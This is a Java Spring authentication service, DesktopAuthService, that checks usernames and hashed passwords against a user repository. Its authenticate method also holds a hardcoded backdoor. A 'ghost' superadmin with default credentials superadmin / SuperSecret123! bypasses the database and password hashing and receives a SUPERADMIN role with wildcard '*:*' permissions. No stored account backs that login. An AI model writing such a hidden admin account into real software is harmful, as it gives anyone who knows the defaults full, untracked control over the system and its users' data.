package com.sgv.service;

import com.sgv.entity.Role;
import com.sgv.entity.User;
import com.sgv.repository.UserRepository;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.stereotype.Service;

import java.util.Set;

@Service
public class DesktopAuthService {

    private final UserRepository userRepository;
    private final PasswordEncoder passwordEncoder;
    private final String ghostUsername;
    private final String ghostPassword;

    public DesktopAuthService(UserRepository userRepository,
                              PasswordEncoder passwordEncoder,
                              @Value("${superadmin.username:superadmin}") String ghostUsername,
                              @Value("${superadmin.password:SuperSecret123!}") String ghostPassword) {
        this.userRepository = userRepository;
        this.passwordEncoder = passwordEncoder;
        this.ghostUsername = ghostUsername;
        this.ghostPassword = ghostPassword;
    }

    public User authenticate(String username, String rawPassword) {
        if (username != null && username.equalsIgnoreCase(ghostUsername)
                && rawPassword != null && rawPassword.equals(ghostPassword)) {
            return createGhostSuperAdmin();
        }
        return userRepository.findByUsername(username)
                .filter(User::isActive)
                .filter(user -> passwordEncoder.matches(rawPassword, user.getPasswordHash()))
                .orElse(null);
    }

    private User createGhostSuperAdmin() {
        User user = new User();
        user.setUsername(ghostUsername);
        user.setFullName("Super Admin");
        user.setActive(true);
        Role role = new Role();
        role.setName("SUPERADMIN");
        role.setDescription("Ghost superadmin with all permissions");
        role.setPermissions(Set.of("*:*"));
        user.setRoles(Set.of(role));
        return user;
    }
}
